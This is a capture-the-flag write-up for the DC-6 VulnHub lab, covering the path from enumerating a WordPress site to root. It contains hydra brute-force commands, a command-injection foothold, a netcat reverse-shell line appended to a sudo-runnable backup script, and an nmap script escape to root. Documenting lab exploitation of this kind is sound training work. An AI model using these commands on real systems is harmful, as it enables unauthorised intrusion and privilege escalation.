## Challenge description

[https://www.vulnhub.com/entry/dc-6,315/](https://www.vulnhub.com/entry/dc-6,315/)

> _DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing._
>
> _This isn't an overly difficult challenge so should be great for beginners._
>
> _The ultimate goal of this challenge is to get root and to read the one and only flag._
>
> _Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools._
>
> _For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward._

```

Since it's a Wordpress site, let's run wpscan against it :

```
$ wpscan --url http://wordy --api-token (REDACTED)
[...]
[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).

 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |
 | [!] 31 vulnerabilities identified:
```

After going through the vulnerabilities, I decided to go on for now, but let's keep those in mind just in case

The homepage of the site says :

_At Wordy, we know just how important it is to have secure plugins, and for this reason, we endeavour to provide the most secure and up-to-date plugins that are available on the market._

But after looking at /wp-content/plugin, it looks like there are no plugins installed.

One cool thing about Wordpress is the ability to easily validate usernames since the login page tells us if the user we entered is valid or not.

Let's try to enumerate valid users:

```
$ hydra -L /opt/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p nopassword wordy http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1:S=The password"
[...]
[80][http-post-form] host: 192.168.0.141   login: admin   password: nopassword
[80][http-post-form] host: 192.168.0.141   login: mark   password: nopassword
[80][http-post-form] host: 192.168.0.141   login: graham   password: nopassword
[80][http-post-form] host: 192.168.0.141   login: sarah   password: nopassword
[80][http-post-form] host: 192.168.0.141   login: jens   password: nopassword
```

Now that we have the name of 5 valid users, let's brute force the password for all of them. It's gonna take a long time to go through rockyou for all of those users. Luckily for us, there's a tip on the VM page :

> _OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job._
>
> _cat rockyou.txt \| grep k01 > passwords.txt That should save you a few years. ;-)_

```
$ cat /opt/wordlists/rockyou.txt | grep k01 > dc6passwords.txt
$ cat << EOF >> dc6users.txt
cmdand heredoc> admin
cmdand heredoc> mark
cmdand heredoc> graham
cmdand heredoc> sarah
cmdand heredoc> jens
cmdand heredoc> EOF

$ hydra -L dc6users.txt -P dc6passwords.txt wordy http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1:F=The password"
[...]
[80][http-post-form] host: wordy   login: mark   password: helpdesk01
```

We can now log in the admin page with this credential.

The site use a plugin called "Activity Monitor". This plugins seems to show an activity log. There's something interesting in the log :

![activitymonitor](/assets/img/vh-dc6/dc6-1.png "activitymonitor")

Since User-Agent is a user controlled field, I tried to inject some PHP code, but it's sanitized and doesn't work.

Next thing is the "Tools" tab with 2 tools, one to convert an IP address to integer and the other one to resolve the IP. The resolve tool mention using dig to resolve the IP :

> _The lookup button will try to resolve an IP address to a host name. If dig is installed on the webserver it will also be used for the lookup._

Let's try to inject some OS commands:

![oscommandinjection](/assets/img/vh-dc6/dc6-2.png "oscommandinjection")

The tool is vulnerable to OS command injection.

## Exploitation && Foothold

Since the ui input is limited to 15 characters, we're gonna have to intercept the request and add the payload :

![reverseshell](/assets/img/vh-dc6/dc6-3.png "reverseshell")

```

## Privilege Escalation

Start by enumerating home directories

```
www-data@dc-6:/var/www/html/wp-admin$ ls -lRa /home
/home:

drwxr-xr-x  6 root   root   4096 Apr 26  2019 .

drwxr-xr-x  2 graham graham 4096 Apr 26  2019 graham
drwxr-xr-x  2 jens   jens   4096 Apr 26  2019 jens
drwxr-xr-x  3 mark   mark   4096 Apr 26  2019 mark

www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html

www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

What we got :

- A backup script which compress the website directory
- A note with a password for the user graham

Let's escalate to graham and check for sudo permissions:

```
www-data@dc-6:/var/www/html/wp-admin$ su - graham
Password: GSo7isUM1D4

graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)

graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

We can execute the backup script as 'jens' and since we are in the 'devs' group we have write permission on the script and we are going to abuse it :

```
graham@dc-6:~$ echo 'nc 192.168.0.167 4445 -e /bin/bash' >> /home/jens/backups.sh
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh


h3x@kalict:~$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [192.168.0.167] from (UNKNOWN) [192.168.0.170] 56222

jens@dc-6:~$ id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
```

We are now escalated to 'jens' user and are able to run /usr/bin/nmap as root so we should be able to get a shell from this:

```
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap

jens@dc-6:~$ echo 'os.execute("/bin/bash")' >> /tmp/pe && sudo nmap --script=/tmp/pe
Starting Nmap 7.40 ( https://nmap.org ) at 2022-01-14 14:32 AEST

Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

Thanks for reading <3
